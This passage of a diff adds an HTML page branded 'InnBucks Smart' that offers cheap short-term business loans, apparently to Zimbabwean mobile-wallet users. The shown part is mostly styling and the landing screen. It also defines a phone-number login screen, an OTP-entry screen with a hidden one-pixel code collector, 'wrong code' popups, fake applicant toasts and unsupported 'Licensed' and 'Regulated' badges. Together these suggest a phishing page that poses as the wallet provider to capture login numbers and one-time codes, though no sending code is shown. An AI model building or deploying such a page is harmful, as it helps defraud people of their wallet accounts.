@@ -1,0 +1,1244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>InnBucks Smart</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --blue:       #1e4ecf;
+  --blue-mid:   #2563EB;
+  --blue-light: #eef4ff;
+  --blue-grad:  linear-gradient(150deg, #1a3fa8 0%, #2055d4 60%, #2f6be8 100%);
+  --dark:       #111827;
+  --text:       #1e293b;
+  --muted:      #6b7280;
+  --muted2:     #9ca3af;
+  --border:     #e5e7eb;
+  --bg:         #f5f7fa;
+  --card:       #ffffff;
+  --input-bg:   #f3f4f6;
+  --green:      #15803d;
+  --green-bg:   #f0fdf4;
+  --navy:       #192133;
+  --radius:     18px;
+  --red:        #dc2626;
+  --red-bg:     #fef2f2;
+  --yellow:     #f59e0b;
+  --yellow-bg:  #fffbeb;
+}
+
+body {
+  font-family: 'Inter', -apple-system, sans-serif;
+  background: #dde3ec;
+  display: flex;
+  justify-content: center;
+  min-height: 100vh;
+  padding: 0;
+  margin: 0;
+}
+
+/* ══ APP SHELL - Now responsive ══ */
+.app {
+  width: 100%;
+  max-width: 100%;
+  min-height: 100vh;
+  background: var(--bg);
+  position: relative;
+  overflow: hidden;
+  box-shadow: 0 0 80px rgba(0,0,0,0.18);
+}
+
+@media (min-width: 431px) {
+  .app {
+    max-width: 430px;
+    margin: 0 auto;
+    border-radius: 24px;
+    min-height: 90vh;
+    margin-top: 5vh;
+    margin-bottom: 5vh;
+  }
+}
+
+/* ══ SCREEN SYSTEM ══ */
+.screen {
+  width: 100%;
+  min-height: 100vh;
+  position: absolute;
+  top: 0; left: 0;
+  display: flex;
+  flex-direction: column;
+  transition: transform 0.3s cubic-bezier(0.4,0,0.2,1), opacity 0.25s ease;
+  will-change: transform;
+  overflow-y: auto;
+  -webkit-overflow-scrolling: touch;
+}
+@media (min-width: 431px) {
+  .screen {
+    min-height: 90vh;
+  }
+}
+.screen.active { transform: translateX(0);     opacity: 1; pointer-events: all;  z-index: 2; }
+.screen.left   { transform: translateX(-100%);  opacity: 0; pointer-events: none; z-index: 1; }
+.screen.right  { transform: translateX(100%);   opacity: 0; pointer-events: none; z-index: 1; }
+
+/* ══ SMART LOGO (light screens) ══ */
+.logo-bar {
+  display: flex; align-items: center; justify-content: center;
+  gap: 9px; padding: 26px 24px 0;
+}
+.logo-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 3.5px; }
+.lg { width: 9px; height: 9px; border-radius: 50%; }
+.lg.o { background: #f59e0b; }
+.lg.p { background: #7c3aed; }
+.lg.g { background: #16a34a; }
+.lg.r { background: #dc2626; }
+.logo-name { font-size: 18px; font-weight: 700; color: var(--text); letter-spacing: -0.2px; }
+.logo-name em { font-style: normal; color: var(--blue-mid); }
+
+/* ══ PAGE CARD ══ */
+.page-card {
+  margin: 18px 14px 24px;
+  background: var(--card);
+  border-radius: var(--radius);
+  padding: 26px 22px;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.06), 0 4px 20px rgba(0,0,0,0.05);
+  flex: 1;
+}
+
+/* ══ STEP / PROGRESS ══ */
+.step-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+.step-tag {
+  font-size: 10.5px; font-weight: 600; letter-spacing: 0.07em;
+  color: var(--blue-mid); background: var(--blue-light);
+  padding: 4px 10px; border-radius: 20px;
+}
+.step-secure {
+  font-size: 10.5px; font-weight: 500; color: var(--muted);
+  display: flex; align-items: center; gap: 4px;
+}
+.step-secure svg { width: 11px; height: 11px; }
+.progress-bar { height: 4px; background: var(--border); border-radius: 4px; overflow: hidden; margin-bottom: 26px; }
+.progress-fill { height: 100%; background: var(--blue-grad); border-radius: 4px; transition: width 0.45s ease; }
+
+.section-title { font-size: 20px; font-weight: 700; color: var(--dark); margin-bottom: 6px; letter-spacing: -0.3px; }
+.section-sub   { font-size: 13px; color: var(--muted); margin-bottom: 22px; line-height: 1.5; }
+
+/* ══ FORM FIELDS ══ */
+.field { margin-bottom: 18px; }
+.field-label {
+  display: block; font-size: 11px; font-weight: 600;
+  letter-spacing: 0.06em; color: var(--muted);
+  margin-bottom: 7px; text-transform: uppercase;
+}
+.field input, .field select {
+  width: 100%; padding: 13px 15px;
+  background: var(--input-bg); border: 1.5px solid transparent;
+  border-radius: 11px; font-size: 14.5px; font-family: 'Inter', sans-serif;
+  color: var(--text); outline: none;
+  transition: border-color 0.18s, background 0.18s; -webkit-appearance: none;
+}
+.field input:focus, .field select:focus {
+  border-color: var(--blue-mid); background: #fff;
+  box-shadow: 0 0 0 3px rgba(37,99,235,0.09);
+}
+.field input::placeholder { color: var(--muted2); }
+.field-pair { display: grid; grid-template-columns: 1fr 1fr; gap: 11px; }
+
+.phone-field { display: flex; gap: 8px; }
+.dial-code {
+  padding: 13px 14px; background: var(--input-bg); border-radius: 11px;
+  font-size: 14px; font-weight: 600; color: var(--text); white-space: nowrap; flex-shrink: 0;
+}
+.phone-field input {
+  flex: 1; padding: 13px 15px; background: var(--input-bg);
+  border: 1.5px solid transparent; border-radius: 11px; font-size: 14.5px;
+  font-family: 'Inter', sans-serif; color: var(--text); outline: none;
+  transition: border-color 0.18s, background 0.18s;
+}
+.phone-field input:focus { border-color: var(--blue-mid); background: #fff; box-shadow: 0 0 0 3px rgba(37,99,235,0.09); }
+.phone-field input::placeholder { color: var(--muted2); }
+
+/* ══ REPAYMENT BOX ══ */
+.repay-box {
+  background: var(--blue-grad); border-radius: 13px;
+  padding: 16px 18px; display: flex; justify-content: space-between;
+  align-items: center; margin-bottom: 20px;
+}
+.repay-box-left .rb-label { font-size: 10.5px; font-weight: 600; letter-spacing: 0.06em; color: rgba(255,255,255,0.65); margin-bottom: 2px; }
+.repay-box-left .rb-note  { font-size: 10.5px; color: rgba(255,255,255,0.45); }
+.repay-box-right { font-size: 26px; font-weight: 800; color: #fff; letter-spacing: -0.5px; }
+
+/* ══ SUMMARY CARD ══ */
+.summary-card { background: var(--dark); border-radius: 14px; padding: 20px; margin-bottom: 16px; }
+.s-row { display: flex; justify-content: space-between; align-items: baseline; padding: 12px 0; border-bottom: 1px solid rgba(255,255,255,0.06); }
+.s-row:last-child  { border-bottom: none; padding-bottom: 0; }
+.s-row:first-child { padding-top: 0; }
+.s-label { font-size: 10.5px; font-weight: 600; letter-spacing: 0.07em; color: #6b7280; }
+.s-value { font-size: 15px; font-weight: 600; color: #f9fafb; }
+
+.legal-note {
+  font-size: 11.5px; color: var(--muted); line-height: 1.6;
+  margin-bottom: 20px; padding: 12px 14px; background: #f9fafb;
+  border-radius: 10px; border-left: 3px solid var(--border);
+}
+
+/* ══ BUTTONS ══ */
+.btn-row { display: flex; gap: 10px; }
+.btn {
+  flex: 1; padding: 14px 16px; border: none; border-radius: 12px;
+  font-size: 13.5px; font-weight: 600; font-family: 'Inter', sans-serif;
+  cursor: pointer; letter-spacing: 0.02em; transition: all 0.17s;
+  display: flex; align-items: center; justify-content: center; gap: 5px;
+}
+.btn-primary { background: var(--blue-grad); color: #fff; box-shadow: 0 2px 10px rgba(30,78,207,0.28); }
+.btn-primary:hover  { filter: brightness(1.06); }
+.btn-primary:active { transform: scale(0.99); }
+.btn-ghost { background: var(--input-bg); color: var(--muted); border: 1px solid var(--border); }
+.btn-ghost:hover { background: #e9ecef; }
+.btn-submit { background: var(--dark); color: #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.18); }
+.btn-submit:hover { background: #1f2937; }
+.btn-full { width: 100%; }
+
+/* ══ LOADING OVERLAY ══ */
+.loading-overlay {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0,0,0,0.5);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.2s ease, visibility 0.2s ease;
+}
+.loading-overlay.show {
+  opacity: 1;
+  visibility: visible;
+}
+.loading-card {
+  background: var(--card);
+  border-radius: 22px;
+  padding: 24px 20px;
+  max-width: 200px;
+  width: auto;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+}
+.loading-spinner {
+  width: 32px;
+  height: 32px;
+  border: 3px solid var(--border);
+  border-top-color: var(--blue-mid);
+  border-radius: 50%;
+  animation: spin 0.6s linear infinite;
+  margin: 0 auto 8px;
+}
+.loading-text {
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--text);
+}
+@keyframes spin { to{transform:rotate(360deg)} }
+
+/* ══ POPUP NOTIFICATION ══ */
+.popup-overlay {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0,0,0,0.5);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.2s ease, visibility 0.2s ease;
+}
+.popup-overlay.show {
+  opacity: 1;
+  visibility: visible;
+}
+.popup-card {
+  background: var(--card);
+  border-radius: 22px;
+  padding: 24px 20px;
+  max-width: 300px;
+  width: 90%;
+  text-align: center;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+}
+.popup-icon {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+  margin: 0 auto 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.popup-icon.wrong {
+  background: var(--red-bg);
+}
+.popup-icon.wrong svg {
+  stroke: var(--red);
+}
+.popup-icon.continue {
+  background: var(--yellow-bg);
+}
+.popup-icon.continue svg {
+  stroke: var(--yellow);
+}
+.popup-icon svg {
+  width: 24px;
+  height: 24px;
+  fill: none;
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+}
+.popup-title {
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--dark);
+  margin-bottom: 8px;
+}
+.popup-message {
+  font-size: 14px;
+  color: var(--muted);
+  line-height: 1.5;
+  margin-bottom: 20px;
+}
+.popup-button {
+  background: var(--blue-grad);
+  color: #fff;
+  border: none;
+  padding: 12px 20px;
+  border-radius: 12px;
+  font-size: 14px;
+  font-weight: 600;
+  width: 100%;
+  cursor: pointer;
+  transition: opacity 0.2s;
+}
+.popup-button:hover {
+  opacity: 0.9;
+}
+
+/* ══ OTP ERROR MESSAGE ══ */
+.otp-error {
+  background: var(--red-bg);
+  color: var(--red);
+  padding: 12px;
+  border-radius: 8px;
+  margin: 16px 28px 0;
+  text-align: center;
+  font-size: 14px;
+  border: 1px solid rgba(220, 38, 38, 0.2);
+  display: none;
+}
+.otp-error.show {
+  display: block;
+}
+
+/* ══ SOCIAL PROOF TOAST ══ */
+.s-toast {
+  position: absolute; bottom: 24px; left: 14px; right: 14px;
+  background: #fff; border: 1px solid var(--border); border-radius: 12px;
+  padding: 11px 14px; display: flex; align-items: center; gap: 10px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.10); opacity: 0;
+  transform: translateY(8px); transition: opacity 0.3s ease, transform 0.3s ease;
+  pointer-events: none; z-index: 10;
+}
+.s-toast.show { opacity: 1; transform: translateY(0); }
+.s-avatar { width: 32px; height: 32px; border-radius: 50%; background: var(--blue-light); display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; color: var(--blue-mid); flex-shrink: 0; }
+.s-toast-text .tt-name { font-size: 12.5px; font-weight: 600; color: var(--text); }
+.s-toast-text .tt-desc { font-size: 11.5px; color: var(--muted); margin-top: 1px; }
+.s-toast-check { width: 20px; height: 20px; border-radius: 50%; background: var(--green-bg); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.s-toast-check svg { width: 11px; height: 11px; stroke: var(--green); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
+
+/* ══════════════════════════
+   SCREEN 1 — LANDING
+══════════════════════════ */
+#screen-landing { background: var(--bg); }
+
+.hero-wrap {
+  margin: 18px 14px 14px;
+  background: var(--blue-grad); border-radius: 22px;
+  padding: 24px 22px 20px; position: relative; overflow: hidden;
+  box-shadow: 0 6px 28px rgba(30,78,207,0.3);
+}
+.hero-wrap::after {
+  content: ''; position: absolute; inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle fill='%23ffffff' cx='20' cy='20' r='1' opacity='0.04'/%3E%3C/svg%3E");
+  border-radius: 22px; pointer-events: none;
+}
+.hero-inner { display: flex; align-items: flex-start; gap: 10px; position: relative; z-index: 1; }
+.hero-left { flex: 1; }
+.hero-right { flex-shrink: 0; padding-top: 4px; }
+.hero-eyebrow { font-size: 10px; font-weight: 600; letter-spacing: 0.1em; color: rgba(255,255,255,0.6); text-transform: uppercase; margin-bottom: 8px; }
+.hero-title { font-size: 21px; font-weight: 800; color: #fff; line-height: 1.22; letter-spacing: -0.4px; margin-bottom: 10px; }
+.hero-desc  { font-size: 12.5px; color: rgba(255,255,255,0.65); line-height: 1.5; margin-bottom: 16px; max-width: 200px; }
+.live-pill {
+  display: inline-flex; align-items: center; gap: 6px;
+  background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.18);
+  color: rgba(255,255,255,0.9); font-size: 11px; font-weight: 500;
+  padding: 5px 12px; border-radius: 30px;
+}
+.live-dot { width: 6px; height: 6px; border-radius: 50%; background: #4ade80; flex-shrink: 0; animation: livepulse 2s ease-in-out infinite; }
+@keyframes livepulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+/* Calc card */
+.calc-wrap { margin: 0 14px 12px; background: var(--card); border-radius: 18px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.05), 0 4px 16px rgba(0,0,0,0.05); }
+.calc-top  { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 12px; }
+.calc-label-sm { font-size: 11px; font-weight: 600; letter-spacing: 0.06em; color: var(--muted); text-transform: uppercase; }
+.calc-amount   { font-size: 32px; font-weight: 800; color: var(--blue); letter-spacing: -0.8px; line-height: 1; }
+.range-wrap { margin-bottom: 18px; }
+input[type=range] { width: 100%; height: 5px; -webkit-appearance: none; border-radius: 5px; outline: none; cursor: pointer; }
+input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 20px; height: 20px; border-radius: 50%; background: #fff; border: 2.5px solid var(--blue-mid); box-shadow: 0 1px 6px rgba(37,99,235,0.25); cursor: pointer; }
+.calc-meta { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 18px; }
+.meta-box { background: var(--bg); border-radius: 12px; padding: 12px 14px; border: 1px solid var(--border); }
+.meta-box .mb-label { font-size: 10px; font-weight: 600; letter-spacing: 0.07em; color: var(--muted); margin-bottom: 4px; text-transform: uppercase; }
+.meta-box .mb-value { font-size: 17px; font-weight: 700; color: var(--text); }
+.meta-box .mb-note  { font-size: 10px; color: var(--muted2); margin-top: 2px; }
+
+/* Trust bar */
+.trust-bar { margin: 0 14px 12px; background: var(--card); border-radius: 14px; padding: 14px 20px; display: flex; justify-content: space-around; border: 1px solid var(--border); }
+.trust-item { display: flex; flex-direction: column; align-items: center; gap: 5px; }
+.trust-icon { width: 32px; height: 32px; border-radius: 9px; background: var(--blue-light); display: flex; align-items: center; justify-content: center; }
+.trust-icon svg { width: 16px; height: 16px; }
+.trust-label { font-size: 9.5px; font-weight: 600; color: var(--muted); letter-spacing: 0.05em; text-transform: uppercase; }
+
+/* Feature list */
+.feature-list { margin: 0 14px; display: flex; flex-direction: column; gap: 1px; margin-bottom: 32px; }
+.feature-row { background: var(--card); padding: 15px 18px; display: flex; align-items: center; gap: 14px; border-bottom: 1px solid var(--border); }
+.feature-row:first-child { border-radius: 14px 14px 0 0; }
+.feature-row:last-child  { border-radius: 0 0 14px 14px; border-bottom: none; }
+.ficon { width: 38px; height: 38px; border-radius: 10px; background: var(--blue-light); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.ficon svg { width: 18px; height: 18px; stroke: var(--blue-mid); fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+.ftext h4 { font-size: 13.5px; font-weight: 600; color: var(--text); margin-bottom: 2px; }
+.ftext p  { font-size: 12px; color: var(--muted); line-height: 1.4; }
+
+/* ══════════════════════════
+   SUCCESS SCREEN (Smart)
+══════════════════════════ */
+#screen-success { background: var(--bg); align-items: center; justify-content: center; padding: 0 20px 40px; }
+.success-banner {
+  position: absolute; top: 24px; left: 14px; right: 14px;
+  background: var(--dark); color: #fff; padding: 13px 16px; border-radius: 13px;
+  display: flex; align-items: center; gap: 10px; font-size: 13px; font-weight: 500;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+  animation: bannerIn 0.5s cubic-bezier(0.34,1.2,0.64,1) 0.2s both;
+}
+@keyframes bannerIn { from{opacity:0;transform:translateY(-12px)} to{opacity:1;transform:translateY(0)} }
+.banner-dot { width: 8px; height: 8px; border-radius: 50%; background: #4ade80; flex-shrink: 0; }
+.success-card { background: var(--card); border-radius: 22px; padding: 36px 26px 28px; width: 100%; box-shadow: 0 2px 12px rgba(0,0,0,0.07); margin-top: 72px; text-align: center; }
+.success-icon { width: 72px; height: 72px; border-radius: 50%; background: var(--blue-light); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; position: relative; animation: iconPop 0.5s cubic-bezier(0.34,1.4,0.64,1) 0.4s both; }
+@keyframes iconPop { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
+.success-icon > svg { width: 32px; height: 32px; stroke: var(--blue-mid); fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+.success-badge { position: absolute; bottom: 0; right: 0; width: 24px; height: 24px; border-radius: 50%; background: #16a34a; border: 3px solid #fff; display: flex; align-items: center; justify-content: center; animation: iconPop 0.4s cubic-bezier(0.34,1.4,0.64,1) 0.75s both; }
+.success-badge svg { width: 11px; height: 11px; stroke: #fff; fill: none; stroke-width: 2.8; stroke-linecap: round; stroke-linejoin: round; }
+.success-card h2 { font-size: 22px; font-weight: 700; color: var(--dark); margin-bottom: 10px; letter-spacing: -0.3px; }
+.success-card .s-body { font-size: 14px; color: var(--muted); line-height: 1.65; margin-bottom: 6px; }
+.success-card .s-body strong { color: var(--text); font-weight: 600; }
+.success-card .s-note { font-size: 12px; color: var(--muted2); margin-bottom: 24px; }
+.session-bar { background: var(--bg); border: 1px solid var(--border); border-radius: 11px; padding: 13px 16px; display: flex; align-items: center; gap: 11px; margin-bottom: 10px; }
+.spin { width: 18px; height: 18px; border: 2px solid var(--border); border-top-color: var(--blue-mid); border-radius: 50%; animation: spin 0.9s linear infinite; flex-shrink: 0; }
+@keyframes spin { to{transform:rotate(360deg)} }
+.session-text { font-size: 12px; font-weight: 600; color: var(--blue-mid); letter-spacing: 0.05em; }
+.manual-btn { width: 100%; padding: 13px; background: transparent; border: 1px solid var(--border); border-radius: 11px; font-size: 12.5px; font-weight: 600; letter-spacing: 0.05em; color: var(--muted); cursor: pointer; font-family: 'Inter', sans-serif; transition: background 0.15s; }
+.manual-btn:hover { background: var(--bg); }
+.footer-note { margin-top: 20px; font-size: 10.5px; color: var(--muted2); letter-spacing: 0.05em; font-weight: 500; }
+
+/* ══════════════════════════
+   LOGIN SCREEN (dark)
+══════════════════════════ */
+#screen-login { background: var(--navy); justify-content: flex-start; }
+.login-logo-wrap { display: flex; align-items: center; justify-content: center; gap: 12px; padding-top: 68px; }
+.login-dots { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
+.ldot { width: 22px; height: 22px; border-radius: 50%; }
+.login-name { font-size: 28px; font-weight: 700; color: #fff; letter-spacing: -0.3px; }
+.login-heading { text-align: center; padding: 52px 40px 0; }
+.login-heading h1 { font-size: 26px; font-weight: 700; color: #fff; line-height: 1.35; letter-spacing: -0.2px; }
+.login-heading p  { font-size: 14px; color: rgba(255,255,255,0.4); margin-top: 10px; line-height: 1.5; }
+.login-field-wrap { padding: 44px 28px 0; }
+.login-field-row { display: flex; align-items: flex-end; gap: 10px; border-bottom: 1.5px solid rgba(255,255,255,0.18); padding-bottom: 10px; }
+.login-cc { display: flex; align-items: center; gap: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; white-space: nowrap; flex-shrink: 0; }
+.login-cc svg { width: 9px; height: 9px; fill: rgba(255,255,255,0.5); }
+.login-divider { width: 1px; height: 18px; background: rgba(255,255,255,0.15); flex-shrink: 0; }
+.login-input { flex: 1; background: transparent; border: none; outline: none; color: #e2e8f0; font-size: 15px; font-family: 'Inter', sans-serif; padding: 0; }
+.login-input::placeholder { color: rgba(255,255,255,0.28); }
+.login-terms { padding: 22px 28px 0; font-size: 12.5px; color: rgba(255,255,255,0.3); line-height: 1.6; text-align: center; }
+.login-terms span { color: rgba(100,160,255,0.65); }
+.login-security { display: flex; align-items: center; justify-content: center; gap: 6px; padding: 16px 28px 0; }
+.login-security svg { width: 12px; height: 12px; stroke: rgba(255,255,255,0.28); fill: none; stroke-width: 1.8; }
+.login-security span { font-size: 11px; color: rgba(255,255,255,0.28); font-weight: 500; }
+.login-btn-wrap { padding: 0 20px 36px; margin-top: auto; }
+.login-btn { width: 100%; padding: 19px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); border-radius: 14px; color: #fff; font-size: 16px; font-weight: 600; font-family: 'Inter', sans-serif; cursor: pointer; transition: background 0.18s; backdrop-filter: blur(8px); }
+.login-btn:hover { background: rgba(255,255,255,0.16); }
+.login-btn:active { background: rgba(255,255,255,0.08); }
+
+/* ══════════════════════════
+   OTP SCREEN (dark)
+══════════════════════════ */
+#screen-otp { background: var(--navy); }
+.otp-back { padding: 48px 22px 0; cursor: pointer; width: fit-content; }
+.otp-back svg { width: 20px; height: 20px; stroke: rgba(255,255,255,0.7); fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+.otp-heading { text-align: center; padding: 36px 36px 0; }
+.otp-heading h1 { font-size: 22px; font-weight: 700; color: #fff; letter-spacing: -0.2px; margin-bottom: 12px; }
+.otp-heading p  { font-size: 13.5px; color: rgba(255,255,255,0.45); line-height: 1.6; }
+.otp-heading strong { color: rgba(255,255,255,0.75); font-weight: 500; }
+.otp-dots-wrap { display: flex; justify-content: center; gap: 16px; margin-top: 44px; position: relative; }
+.otp-d { width: 14px; height: 14px; border-radius: 50%; transition: background 0.18s, transform 0.14s; }
+.otp-d.empty  { background: rgba(255,255,255,0.15); }
+.otp-d.filled { background: #fff; transform: scale(1.15); }
+.otp-tap-zone { position: absolute; inset: -20px; cursor: text; }
+.resend-wrap { margin-top: 30px; text-align: center; }
+.resend-link { font-size: 14px; font-weight: 500; color: #60a5fa; text-decoration: none; cursor: pointer; background: none; border: none; font-family: 'Inter', sans-serif; }
+.resend-link:hover { color: #93c5fd; }
+.resend-countdown { font-size: 12px; color: rgba(255,255,255,0.3); margin-top: 6px; min-height: 18px; }
+.otp-btn-wrap { padding: 0 20px 36px; }
+.otp-btn { width: 100%; padding: 19px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); border-radius: 14px; color: #fff; font-size: 16px; font-weight: 600; font-family: 'Inter', sans-serif; cursor: pointer; transition: background 0.18s; }
+.otp-btn:hover { background: rgba(255,255,255,0.16); }
+.otp-btn:disabled { opacity: 0.35; cursor: not-allowed; }
+
+.spacer { flex: 1; }
+#otp-collector { position: fixed; opacity: 0; width: 1px; height: 1px; top: 50%; left: 50%; font-size: 16px; border: none; outline: none; background: transparent; }
+</style>
+</head>
+<body>
+<div class="app">
+
+<!-- ══ SIMPLE LOADING OVERLAY ══ -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-card">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Please wait...</div>
+  </div>
+</div>
+
+<!-- ══ POPUP NOTIFICATION (Dynamic) ══ -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-card">
+    <div class="popup-icon" id="popupIcon">
+      <svg viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="12" y1="8" x2="12" y2="12"/>
+        <circle cx="12" cy="16" r="0.5" fill="currentColor"/>
+      </svg>
+    </div>
+    <div class="popup-title" id="popupTitle"></div>
+    <div class="popup-message" id="popupMessage"></div>
+    <button class="popup-button" onclick="closePopup()">OK</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════
+     SCREEN 1 — LANDING
+═══════════════════════════════════════ -->
+<div class="screen active" id="screen-landing">
+  <div class="logo-bar" style="padding-top:22px;">
+    <div class="logo-grid"><div class="lg o"></div><div class="lg p"></div><div class="lg g"></div><div class="lg r"></div></div>
+    <span class="logo-name">InnBucks <em>Smart</em></span>
+  </div>
+
+  <div class="hero-wrap">
+    <div class="hero-inner">
+      <div class="hero-left">
+        <div class="hero-eyebrow">Business Finance</div>
+        <div class="hero-title">Working capital when you need it</div>
+        <div class="hero-desc">Short-term loans for Zimbabwe businesses. Funds go straight to your InnBucks wallet.</div>
+        <div class="live-pill"><div class="live-dot"></div>Applications open</div>
+      </div>
+      <div class="hero-right">
+        <svg width="112" height="118" viewBox="0 0 112 118" fill="none" xmlns="http://www.w3.org/2000/svg" style="filter:drop-shadow(0 3px 10px rgba(0,0,0,0.12))">
+          <rect x="24" y="8" width="54" height="94" rx="11" fill="rgba(255,255,255,0.14)" stroke="rgba(255,255,255,0.3)" stroke-width="1.5"/>
+          <rect x="29" y="18" width="44" height="68" rx="6" fill="rgba(255,255,255,0.08)"/>
+          <rect x="43" y="13" width="16" height="4" rx="2" fill="rgba(255,255,255,0.15)"/>
+          <rect x="34" y="24" width="34" height="22" rx="5" fill="rgba(255,255,255,0.12)"/>
+          <path d="M38 31 h12 M38 36 h8" stroke="rgba(255,255,255,0.5)" stroke-width="2" stroke-linecap="round"/>
+          <circle cx="56" cy="32" r="4" fill="rgba(255,255,255,0.2)" stroke="rgba(255,255,255,0.45)" stroke-width="1.2"/>
+          <rect x="34" y="52" width="20" height="3" rx="1.5" fill="rgba(255,255,255,0.2)"/>
+          <rect x="34" y="58" width="30" height="5" rx="2" fill="rgba(255,255,255,0.35)"/>
+          <rect x="34" y="74" width="7" height="8" rx="2" fill="rgba(255,255,255,0.2)"/>
+          <rect x="43" y="70" width="7" height="12" rx="2" fill="rgba(255,255,255,0.28)"/>
+          <rect x="52" y="66" width="7" height="16" rx="2" fill="rgba(74,222,128,0.7)"/>
+          <rect x="44" y="97" width="14" height="2.5" rx="1.25" fill="rgba(255,255,255,0.2)"/>
+          <rect x="0" y="18" width="30" height="18" rx="6" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.25)" stroke-width="1"/>
+          <circle cx="8" cy="27" r="4" fill="rgba(255,255,255,0.2)"/>
+          <rect x="14" y="24" width="12" height="2.5" rx="1" fill="rgba(255,255,255,0.35)"/>
+          <rect x="14" y="28.5" width="8" height="2" rx="1" fill="rgba(255,255,255,0.2)"/>
+          <circle cx="99" cy="22" r="12" fill="rgba(74,222,128,0.18)" stroke="rgba(74,222,128,0.4)" stroke-width="1.2"/>
+          <path d="M99 28 L99 16 M94 21 L99 16 L104 21" stroke="#4ade80" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          <rect x="80" y="90" width="32" height="18" rx="7" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.25)" stroke-width="1"/>
+          <text x="96" y="103" text-anchor="middle" fill="rgba(255,255,255,0.8)" font-size="9" font-weight="700" font-family="Inter,sans-serif">5% p.a.</text>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <div class="calc-wrap">
+    <div class="calc-top">
+      <span class="calc-label-sm">Loan amount</span>
+      <span class="calc-amount" id="loanAmount">$1,000</span>
+    </div>
+    <div class="range-wrap">
+      <input type="range" id="loanSlider" min="100" max="10000" value="1000" step="50" oninput="updateSlider(this.value)">
+    </div>
+    <div class="calc-meta">
+      <div class="meta-box">
+        <div class="mb-label">Monthly repayment</div>
+        <div class="mb-value" id="monthlyRepay">$87.92</div>
+        <div class="mb-note">over 12 months</div>
+      </div>
+      <div class="meta-box">
+        <div class="mb-label">Interest rate</div>
+        <div class="mb-value">5% p.a.</div>
+        <div class="mb-note">fixed, no surprises</div>
+      </div>
+    </div>
+    <button class="btn btn-primary btn-full" onclick="nav('screen-landing','screen-phase1')">Check my eligibility</button>
+  </div>
+
+  <div class="trust-bar">
+    <div class="trust-item">
+      <div class="trust-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+      <span class="trust-label">Secure</span>
+    </div>
+    <div class="trust-item">
+      <div class="trust-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+      <span class="trust-label">Fast</span>
+    </div>
+    <div class="trust-item">
+      <div class="trust-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+      <span class="trust-label">Licensed</span>
+    </div>
+    <div class="trust-item">
+      <div class="trust-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M3 9h18M9 21V9"/></svg></div>
+      <span class="trust-label">Regulated</span>
+    </div>
+  </div>
+
+  <div class="feature-list">
